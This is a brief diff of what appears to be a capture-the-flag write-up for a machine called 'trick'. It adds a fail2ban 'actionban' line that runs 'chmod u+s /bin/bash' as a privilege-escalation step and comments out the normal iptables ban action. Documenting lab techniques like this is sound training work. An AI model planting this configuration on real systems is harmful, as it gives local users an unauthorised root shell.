@@ -589,7 +589,8 @@ michael@trick:/etc/fail2ban/action
 Step-by-step privilege escalation.
 
 ```shell
-# Commands used
+actionban = chmod u+s /bin/bash    
+#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
 ```
 
 ---
